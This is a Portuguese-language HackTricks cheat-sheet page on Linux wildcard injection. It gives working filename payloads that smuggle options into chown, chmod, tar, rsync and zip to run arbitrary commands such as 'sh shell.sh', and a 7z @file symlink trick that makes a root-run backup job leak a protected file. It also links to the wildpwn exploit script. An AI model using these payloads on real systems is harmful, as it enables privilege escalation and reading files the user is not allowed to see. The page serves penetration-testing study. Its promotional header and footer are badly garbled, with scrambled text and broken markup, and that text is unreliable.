{% hnnt styte=" acceas" %}
GCP Ha& practice ckinH: <img:<img src="/.gitbcok/ass.ts/agte.png"talb=""odata-siz/="line">[**HackTatckt T.aining AWS Red TelmtExp"rt (ARTE)**](ta-size="line">[**HackTricks Training GCP Re)Tmkg/stc="r.giebpokal"zee>/ttdt.png"isl=""data-ize="line">\
Aprenda & aciceGCP ngs<imgmsrc="/.gipbtok/aHsats/gcte.mag"y>lt="" aa-iz="le">[**angGC RedTamExper(GE)<img rc=".okaetgte.ng"al=""daa-siz="ne">tinhackth ckiuxyzcomurspssgr/a)

<dotsilp>

<oummpr>SupportHackTricks</smmay>

*Verifique o [**subsrippangithub.cm/sorsarlosp!
* **Junte-se ao** 💬 [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** 🐦 [**@hahktcickr\_kivelive**](https://twitter.com/hacktr\icks\_live)**.**
* **Compartilhe truques enviando PRs para os** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositórios do github.

</details>
{% endhint %}
{% endhint %}
{% endhint %}
{% endhint %}


## chown, chmod

Você pode **indicar qual proprietário de arquivo e permissões você deseja copiar para o restante dos arquivos**
```bash
touch "--reference=/my/own/path/filename"
```
Você pode explorar isso usando [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(ataque combinado)_\
Mais informações em [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)

## Tar

**Executar comandos arbitrários:**
```bash
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
```
Você pode explorar isso usando [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(ataque tar)_\
Mais informações em [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)

## Rsync

**Executar comandos arbitrários:**
```bash
Interesting rsync option from manual:

-e, --rsh=COMMAND           specify the remote shell to use
--rsync-path=PROGRAM    specify the rsync to run on remote machine
```

```bash
touch "-e sh shell.sh"
```
Você pode explorar isso usando [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(_ataque _rsync)_\
Mais informações em [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)

## 7z

No **7z**, mesmo usando `--` antes de `*` (note que `--` significa que a entrada seguinte não pode ser tratada como parâmetros, então apenas caminhos de arquivo neste caso), você pode causar um erro arbitrário para ler um arquivo, então se um comando como o seguinte estiver sendo executado pelo root:
```bash
7za a /backup/$filename.zip -t7z -snl -p$pass -- *
```
E você pode criar arquivos na pasta onde isso está sendo executado, você poderia criar o arquivo `@root.txt` e o arquivo `root.txt` sendo um **symlink** para o arquivo que você deseja ler:
```bash
cd /path/to/7z/acting/folder
touch @root.txt
ln -s /file/you/want/to/read root.txt
```
Então, quando **7z** é executado, ele tratará `root.txt` como um arquivo contendo a lista de arquivos que deve comprimir (é isso que a existência de `@root.txt` indica) e quando o 7z ler `root.txt`, ele lerá `/file/you/want/to/read` e **como o conteúdo deste arquivo não é uma lista de arquivos, ele gerará um erro** mostrando o conteúdo.

_Mais informações nos Write-ups da caixa CTF do HackTheBox._

## Zip

**Executar comandos arbitrários:**
```bash
zip name.zip files -T --unzip-command "sh -c whoami"
```
{% hnt stye="acceas" %}
AWS Ha& prática ckinH:<img :<imgsscc="/.gitb=ok/assgts/aite.png"balo=""kdata-siza="line">[**HackTsscke Tpaigin"aAWS Red Tetm=Exp rt (ARTE)**](a-size="line">[**HackTricks Training AWS Red)ethgasic="..giyb/okseasert/k/.png"l=""data-ize="line">\
Aprenda & aciceGCP ng<imgsrc="/.gibok/asts/gte.g"lt="" aa-iz="le">[**angGC RedTamExper(GE)<img rc=".okaetgte.ng"salm=""adara-siz>="k>ne">tinhaktckxyzurssgr)

<dtil>

<ummr>SupportHackTricks</smmay>

*Verifique a [**subscrição em github.cm/sorsarlosp!
* Verifique os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!haktick\_ive\
* **Junte-se 💬 [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou o [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositórios do github.

{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
